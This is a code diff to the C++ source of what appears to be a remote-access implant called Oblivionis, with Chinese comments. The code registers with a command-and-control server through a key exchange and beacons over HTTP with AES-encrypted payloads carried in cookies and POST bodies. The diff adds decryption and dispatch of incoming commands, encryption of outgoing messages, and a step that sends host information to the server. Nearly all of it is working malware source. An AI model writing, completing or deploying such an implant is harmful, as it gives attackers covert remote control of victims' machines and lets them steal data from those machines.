@@ -4,10 +4,12 @@ OblivionisConfig config;
 Queue head = nullptr, end = nullptr;
 OblivionisAES *globalAES;
 
+#define TOTAL_PRINTF printf
 char httpPostHead[512];
 int httpPostHeadLen;
 char httpGetHead[512];
 int httpGetHeadLen;
+unsigned char temp[2];
 
 SOCKET sock;
 sockaddr_in addr;
@@ -23,7 +25,7 @@ Queue outQueue() {
     return tmp;
 }
 // 这里应该放入需要发送的 Json 文本
-void inQueue(const char *msg) {
+void inQueue(char *msg) {
     Queue node = (Queue)malloc(16);
     node->next = nullptr;
     node->message = msg;
@@ -45,18 +47,18 @@ void networkSuitInitial() {
     memmove(httpPostHead + httpPostHeadLen, tail, 8);
     httpPostHeadLen += 8;
     httpPostHead[httpPostHeadLen] = 0;
-    //printf("httphead POST = \n%s\n", httpPostHead);
+    //TOTAL_PRINTF("httphead POST = \n%s\n", httpPostHead);
     //hexDump((PBYTE)httpPostHead, httpPostHeadLen);
-    //printf("\n");
+    //TOTAL_PRINTF("\n");
 
     httpGetHeadLen = sprintf(httpGetHead, "GET /%s HTTP/1.1\r\nUser-Agent: %s\r\nHost: %s\r\nCustom-Header1: Value1\r\nCustom-Header2: Value2\r\nCookie: cookie1=", config.url, config.useragent, config.host);
     tail = "%s\r\n\r\n";
     memmove(httpGetHead + httpGetHeadLen, tail, 6);
     httpGetHeadLen += 6;
     httpGetHead[httpGetHeadLen] = 0;
-    //printf("httphead GET = \n%s\n", httpGetHead);
+    //TOTAL_PRINTF("httphead GET = \n%s\n", httpGetHead);
     //hexDump((PBYTE)httpGetHead, httpGetHeadLen);
-    //printf("\n");
+    //TOTAL_PRINTF("\n");
     initSocket();
 }
 
@@ -65,7 +67,7 @@ void networkSuitInitial() {
 void initSocket() {
     WSADATA wsaData;
     if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        printf("error at WSAStartup\n");
+        TOTAL_PRINTF("error at WSAStartup\n");
         exit(-1);
     }
    
@@ -78,11 +80,11 @@ void initSocket() {
 void connectSocket() {
      sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if(sock == INVALID_SOCKET) {
-        printf("Error at create socket\n");
+        TOTAL_PRINTF("Error at create socket\n");
         exit(-1);
     }
     if(connect(sock, (sockaddr *)&addr, sizeof(addr)) != 0) {
-        printf("Error in connect. code = %d\n", WSAGetLastError());
+        TOTAL_PRINTF("Error in connect. code = %d\n", WSAGetLastError());
         closesocket(sock);
         WSACleanup();
         exit(-1);
@@ -111,27 +113,46 @@ void analyze200OK(char *ok, char **data, int *len) {
 char cmd[4096];
 void Receive200OK() {
     int recvLen = RECV_BUF
+    CLOSE_SOCK
+
+    TOTAL_PRINTF("received %d bytes\n", recvLen);
     // todo
     char *encryptCMD;
     int cmdLen;
     analyze200OK(buf, &encryptCMD, &cmdLen);
+    if(cmdLen == 0) return;
+
     memmove(cmd, encryptCMD, cmdLen);
     globalAES->DecryptData((PBYTE)cmd, &cmdLen);
-    printf("cmd = \n%s", cmd);
+    short cmdNum = *((short *)cmd);
+    char *args = cmd + 2;
+    int argsLen = cmdLen - 2;
+    args[argsLen] = '\x00';
+    TOTAL_PRINTF("cmd = %d, args = %s\n", cmdNum, args);
 
-    printf("close socket\n");
-    CLOSE_SOCK
+    char *message;
+    int msgLen;
+    switch(cmdNum) {
+        case 2: message = commandEcho(args, argsLen, &msgLen); break;
+        default: message = nullptr;
+    }
+    if(message != nullptr) {
+        inQueue(message);
+    }
+    TOTAL_PRINTF("close socket\n");
+    
 }
 /* 在套接字已建立连接的情况下
  * 调用这个函数来向 C2 发送数据包 */
 void sockSend(char *buf, int len) {
     if(send(sock, buf, len, 0) == SOCKET_ERROR) {
-        printf("Error in send\n");
+        TOTAL_PRINTF("Error in send\n");
         closesocket(sock);
         WSACleanup();
         exit(0);
     }
 }
+char msgEncrypt[4096];
 void PostBreath() {
     while(true) {
         Sleep(config.sleep);
@@ -141,10 +162,20 @@ void PostBreath() {
         if(node == nullptr) {
             len = sprintf(buf, httpPostHead, 0, "");
         }else {
-            len = sprintf(buf, httpPostHead, strlen(node->message), node->message);
+            int msgLen = strlen(node->message);
+            memmove(msgEncrypt, node->message, msgLen);
+            globalAES->EncryptData((PBYTE)msgEncrypt, &msgLen);
+            
+            len = sprintf(buf, httpPostHead, msgLen, temp) - 1;
+            for(int i = 0; i < msgLen; i++) {
+                buf[len + i] = msgEncrypt[i];
+            }
+            len += msgLen;
         }
+        free(node->message);
+        free(node);
         sockSend(buf, len);
-        printf("send %d bytes\n", len);
+        TOTAL_PRINTF("send %d bytes\n", len);
         Receive200OK();
     }
 }
@@ -157,7 +188,6 @@ void registerC2() {
     PBYTE encryptA;
     char *base64;
     int encryptA_Len;
-    unsigned char temp[2];
     temp[0] = 'a'; temp[1] = 0;
     /*
     Uint128 b11 = RandomU128;
@@ -166,7 +196,7 @@ void registerC2() {
     encryptA = a_b11.toBytes();
     len = sprintf(buf, httpPostHead, 16, temp) - 1;
     hexDump((PBYTE)buf, len);
-    printf("\n\n");
+    TOTAL_PRINTF("\n\n");
     for(i = 0; i < 16; i++) {
         buf[len + i] = encryptA[i];
     }
@@ -174,7 +204,7 @@ void registerC2() {
     hexDump((PBYTE)buf, len);*/
 
     // Step.1 向 C2 发送 GET 请求, cookie 中包含 Base64[AES(a, a)]
-    printf("Step.1 Send GET to C2, cookie = Base64[AES(a, a)]\n");
+    TOTAL_PRINTF("Step.1 Send GET to C2, cookie = Base64[AES(a, a)]\n");
 
     OblivionisAES aes(config.a);
     encryptA = (PBYTE)malloc(0x24);
@@ -185,8 +215,8 @@ void registerC2() {
     len = sprintf(buf, httpGetHead, base64);
 
 
-    printf("base64 = %s\n", base64);
-    printf("HTTP Request = \n%s\n", buf);
+    TOTAL_PRINTF("base64 = %s\n", base64);
+    TOTAL_PRINTF("HTTP Request = \n%s\n", buf);
     connectSocket();
     sockSend(buf, len);
     free(base64);
@@ -194,15 +224,15 @@ void registerC2() {
 
 
     // Step.2 接收 C2 发回的 200 OK，查看其中是否存在 0xbeebeebe
-    printf("Step.2 Receive 200 OK from C2, check the 0xbeebeebe\n");
+    TOTAL_PRINTF("Step.2 Receive 200 OK from C2, check the 0xbeebeebe\n");
     RECV_BUF
     CLOSE_SOCK
     analyze200OK(buf, &base64, &len);
     if(*((DWORD *)base64) != 0xbeebeebe) {
-        printf("Cannot found 0xbeebeebe, or failed to analyze 200 OK pack\n");
+        TOTAL_PRINTF("Cannot found 0xbeebeebe, or failed to analyze 200 OK pack\n");
         //exit(0);
     }else {
-        printf("Receive 0xbeebeebe successful\n");
+        TOTAL_PRINTF("Receive 0xbeebeebe successful\n");
     }
 
 
@@ -216,12 +246,12 @@ void registerC2() {
         buf[len + i] = encryptA[i];
     }
     len += 16;
-    printf("Step.3 Send a^b1 to C2.\n");
-    printf("a^b1 = \n");
+    TOTAL_PRINTF("Step.3 Send a^b1 to C2.\n");
+    TOTAL_PRINTF("a^b1 = \n");
     hexDump(encryptA, 16);
-    printf("as hex = ");
+    TOTAL_PRINTF("as hex = ");
     a_b1.printHex();
-    printf("\n");
+    TOTAL_PRINTF("\n");
     connectSocket();
     sockSend(buf, len);
 
@@ -230,22 +260,22 @@ void registerC2() {
     RECV_BUF
     CLOSE_SOCK
     analyze200OK(buf, &base64, &len);
-    printf("Step.4 Receive a^b2 from C2\n");
+    TOTAL_PRINTF("Step.4 Receive a^b2 from C2\n");
     Uint128 a_b2 = Uint128((PBYTE)base64);
     Uint128 key = a_b2.modPow(b1);
     globalAES = new OblivionisAES(key.toBytes());
-    printf("a^b2 = \n");
+    TOTAL_PRINTF("a^b2 = \n");
     hexDump(a_b2.toBytes(), 16);
-    printf("as hex = ");
+    TOTAL_PRINTF("as hex = ");
     a_b2.printHex();
-    printf("\nKey = \n");
+    TOTAL_PRINTF("\nKey = \n");
     hexDump(key.toBytes(), 16);
-    printf("as hex = ");
+    TOTAL_PRINTF("as hex = ");
     key.printHex();
 
 
     // Step.5 提交宿主机信息
-    printf("Step.5 Post info of the computer.\n");
+    TOTAL_PRINTF("Step.5 Post info of the computer.\n");
     char buf2[1024];
     len = strlen(info);
     memmove(buf, info, len);
